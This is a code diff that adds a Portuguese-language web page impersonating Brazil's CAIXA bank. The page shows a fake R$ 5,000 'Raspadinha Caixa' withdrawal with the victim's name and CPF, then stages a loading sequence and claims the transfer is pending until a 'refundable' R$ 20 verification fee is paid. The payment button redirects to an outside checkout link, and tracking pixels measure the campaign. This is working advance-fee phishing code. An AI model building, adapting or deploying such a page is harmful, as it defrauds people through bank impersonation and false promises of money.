@@ -1,0 +1,360 @@
+<html lang="pt-BR"><head>
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KB0R572XG6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-KB0R572XG6');
+    </script>
+    <script>
+  window.pixelId = "6908183506b66485dbf2e23f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head><body>﻿
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferência CAIXA</title>
+    <script>
+        localStorage.setItem("upsell", "up3");
+    </script><script>
+  window.pixelId = "692b50ba43f7b96eaa77880c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'caixa-blue2': '#015CA9',
+                        'caixa-light-blue2': '#049FD6',
+                        'caixa-blue': '#1A65C0',
+                        'caixa-light-blue': '#2386D9',
+                        'caixa-orange': '#F39209',
+                    }
+                }
+            }
+        }
+
+        // Variáveis de controle de tempo de carregamento (em segundos)
+        const LOADING_DURATION = 3;
+        const PAYMENT_LOADING_DURATION = 2;
+    </script>
+
+
+
+    <!-- Header Azul -->
+    <div class="bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white px-4 py-3">
+        <div class="flex items-center">
+            <!-- Logo X da CAIXA -->
+            <div class="size-10 rounded flex items-center justify-center mr-3">
+                <img src="images/trevo-white.png" alt="CAIXA" class="w-full">
+            </div>
+
+            <!-- Título e data -->
+            <div class="flex-1">
+                <h1 class="text-sm font-medium">Transferência da Raspadinha Caixa</h1>
+                <p class="text-sm opacity-90" id="currentDateTime">20/08/2025 - 19:21</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Conteúdo principal -->
+    <div class="px-4 py-6">
+        <div>
+            <!-- Resumo da transferência -->
+            <div class="mb-6">
+                <h2 class="text-lg font-bold text-caixa-light-blue mb-2">Resumo da transferência</h2>
+                <p class="text-zinc-600 text-sm">Por favor, verifique as informações.</p>
+            </div>
+
+            <!-- Dados da indenização -->
+            <div class="mb-6">
+                <h3 class="text-caixa-light-blue font-semibold text-sm mb-3">Dados do saque</h3>
+
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Valor</span>
+                    <span class="text-zinc-600 text-sm">R$ 5.000,00</span>
+                </div>
+
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Data do pagamento</span>
+                    <span class="text-zinc-600 text-sm" id="paymentDate">20/08/2025</span>
+                </div>
+            </div>
+
+            <!-- Quem vai receber -->
+            <div class="mb-6">
+                <h3 class="text-caixa-light-blue font-semibold text-sm mb-3">Quem vai receber</h3>
+
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">Nome</span>
+                    <span class="text-zinc-800 text-sm" id="recipientName">--</span>
+                </div>
+
+                <div class="flex justify-between items-center py-1">
+                    <span class="text-zinc-500 font-bold text-sm">CPF</span>
+                    <span class="text-zinc-800 text-sm" id="recipientCPF">--</span>
+                </div>
+            </div>
+
+            <!-- Texto explicativo -->
+            <div class="text-start mb-6">
+                <p class="text-zinc-600 text-sm leading-relaxed">
+                    Clique no botão abaixo para seu saque ser liberado na sua chave pix cadastrada.
+                </p>
+            </div>
+
+            <!-- Botão de confirmação -->
+            <button onclick="handleConfirmation()" class="w-full bg-caixa-orange hover:bg-orange-600 text-white font-bold px-4 py-3 rounded-lg transition-colors duration-200 text-base">
+                CONFIRMAR
+            </button>
+
+            <!-- Estado de loading -->
+            <div id="loadingState" class="hidden mt-6">
+                <div class="w-full bg-zinc-200 rounded-full h-2">
+                    <div id="progressBar" class="bg-caixa-orange h-2 rounded-full transition-all ease-out" style="width: 0%"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Estado de transferência pendente (fora do container principal) -->
+    <div id="pendingState" class="hidden px-4 py-6">
+        <div class="text-center">
+            <!-- Ícone de cadeado -->
+            <div class="flex justify-center mb-4">
+                <img src="images/cadeado-icon.png" alt="Cadeado" class="w-16 h-16">
+            </div>
+
+            <!-- Título principal -->
+            <div class="text-center mb-3">
+                <h2 class="text-xl font-bold text-caixa-light-blue">Transferência Pendente!</h2>
+            </div>
+
+            <!-- Conteúdo explicativo -->
+            <div class="space-y-4 mb-6">
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    <strong> Sr. (a) <span id="pendingName">--</span></strong>, a movimentação do valor de <strong>R$
+                        5.000,00</strong> é incomum de acordo com os seus registros bancários dos últimos 12 meses.
+                </p>
+
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    Por motivos de segurança e regularidade da sua transferência, é necessário a realização do pagamento
+                    da <strong>Taxa de Verificação</strong> no valor de <strong>R$ 20,00</strong>.
+                </p>
+
+                <p class="text-zinc-700 text-sm leading-relaxed">
+                    Confirme o pagamento da validação para sua <strong>transferência será liberada
+                        imediatamente</strong>.
+                </p>
+            </div>
+
+            <!-- Botão de pagamento -->
+            <button onclick="handlePayment()" class="w-full bg-[#30BF63] hover:bg-green-700 text-white font-bold px-4 py-3 rounded-lg transition-colors duration-200 text-base mb-4">
+                EFETUAR O PAGAMENTO DA TAXA
+            </button>
+
+            <!-- Texto final -->
+            <p class="text-zinc-900 text-xs font-bold text-center">
+                Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.
+            </p>
+        </div>
+    </div>
+
+    <!-- Estado de loading em tela cheia -->
+    <div id="fullscreenLoading" class="hidden fixed inset-0 bg-white z-50 flex items-center justify-center">
+        <div class="text-center">
+            <!-- Spinner laranja -->
+            <div class="w-12 h-12 border-4 border-caixa-orange border-t-transparent rounded-full animate-spin mx-auto mb-4">
+            </div>
+            <!-- Texto de loading -->
+            <p class="text-gray-800 text-base">Carregando...</p>
+        </div>
+    </div>
+
+    <script>
+        // Função para formatar CPF
+        function formatarCPF(cpf) {
+            const cpfLimpo = cpf.replace(/\D/g, '');
+
+            if (cpfLimpo.length !== 11) {
+                return cpf;
+            }
+
+            return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        // Função para formatar telefone
+        function formatarTelefone(telefone) {
+            const telefoneLimpo = telefone.replace(/\D/g, '');
+
+            if (telefoneLimpo.length === 11) {
+                // Celular: (11) 99999-9999
+                return telefoneLimpo.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            } else if (telefoneLimpo.length === 10) {
+                // Telefone fixo: (11) 9999-9999
+                return telefoneLimpo.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
+            } else {
+                return telefone; // Retorna o valor original se não for um telefone válido
+            }
+        }
+
+        // Função para obter parâmetros da URL
+        function getURLParams() {
+            const params = new URLSearchParams(window.location.search);
+            return Object.fromEntries(params.entries());
+        }
+
+        // Função para atualizar data e hora atual
+        function updateDateTime() {
+            const now = new Date();
+            const day = now.getDate().toString().padStart(2, '0');
+            const month = (now.getMonth() + 1).toString().padStart(2, '0');
+            const year = now.getFullYear();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+
+            const dateTimeString = `${day}/${month}/${year} - ${hours}:${minutes}`;
+            document.getElementById('currentDateTime').textContent = dateTimeString;
+            document.getElementById('paymentDate').textContent = `${day}/${month}/${year}`;
+        }
+
+        // Função para substituir dados dinâmicos
+        function substituirDados() {
+            // Buscar dados do localStorage
+            let name = null;
+            let cpf = null;
+            
+            try {
+                const cpfData = localStorage.getItem("cpf-data");
+                if (cpfData) {
+                    const data = JSON.parse(cpfData);
+                    name = data.name || null;
+                    cpf = data.cpf || null;
+                }
+            } catch (e) {
+                console.error("Erro ao ler localStorage:", e);
+            }
+
+            // Fallback para parâmetros da URL se não houver no localStorage
+            const params = getURLParams();
+            if (!name && params.name && params.name.trim() !== '') {
+                name = params.name;
+            }
+            if (!cpf && params.document && params.document.trim() !== '') {
+                cpf = params.document;
+            }
+
+            // Nome
+            const nameElement = document.getElementById('recipientName');
+            if (name && name.trim() !== '') {
+                nameElement.textContent = name;
+            }
+
+            // CPF
+            const cpfElement = document.getElementById('recipientCPF');
+            if (cpf && cpf.trim() !== '') {
+                cpfElement.textContent = formatarCPF(cpf);
+            }
+        }
+
+        // Função de confirmação
+        function handleConfirmation() {
+            // Esconder botão e mostrar loading
+            const button = document.querySelector('button');
+            const loadingState = document.getElementById('loadingState');
+
+            button.style.display = 'none';
+            loadingState.classList.remove('hidden');
+
+            // Animar a barra de progresso
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '0%';
+            progressBar.style.transitionDuration = `${LOADING_DURATION}s`;
+
+            // Animar para 100% (completamente preenchida)
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
+
+            // Após o tempo de loading, mostrar loading em tela cheia
+            setTimeout(() => {
+                // Esconder o container principal
+                const mainContainer = document.querySelector('.px-4.py-6');
+                if (mainContainer) {
+                    mainContainer.style.display = 'none';
+                }
+
+                // Mostrar loading em tela cheia
+                document.getElementById('fullscreenLoading').classList.remove('hidden');
+
+                // Após o tempo de loading em tela cheia, mostrar estado pendente
+                setTimeout(() => {
+                    // Esconder loading em tela cheia
+                    document.getElementById('fullscreenLoading').classList.add('hidden');
+
+                    // Mostrar estado pendente
+                    document.getElementById('pendingState').classList.remove('hidden');
+
+                    // Atualizar nome no estado pendente
+                    let pendingName = null;
+                    try {
+                        const cpfData = localStorage.getItem("cpf-data");
+                        if (cpfData) {
+                            const data = JSON.parse(cpfData);
+                            pendingName = data.name || null;
+                        }
+                    } catch (e) {
+                        console.error("Erro ao ler localStorage:", e);
+                    }
+                    
+                    // Fallback para parâmetros da URL
+                    if (!pendingName) {
+                        const params = getURLParams();
+                        if (params.name && params.name.trim() !== '') {
+                            pendingName = params.name;
+                        }
+                    }
+                    
+                    const pendingNameElement = document.getElementById('pendingName');
+                    if (pendingName && pendingName.trim() !== '') {
+                        pendingNameElement.textContent = pendingName;
+                    }
+                }, PAYMENT_LOADING_DURATION * 1000);
+            }, LOADING_DURATION * 1000);
+        }
+
+        // Função de pagamento
+        function handlePayment() {
+            // Redirecionar diretamente para checkout
+            const params = new URLSearchParams(window.location.search);
+            const baseUrl = "https://go.transacaomarketplace.com/8ldzn25ipm";
+            window.location.href = `${baseUrl}?${params.toString()}`;
+        }
+
+        // Inicializar quando a página carregar
+        document.addEventListener("DOMContentLoaded", () => {
+            updateDateTime();
+            substituirDados();
+        });
+    </script>
+
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body></html>
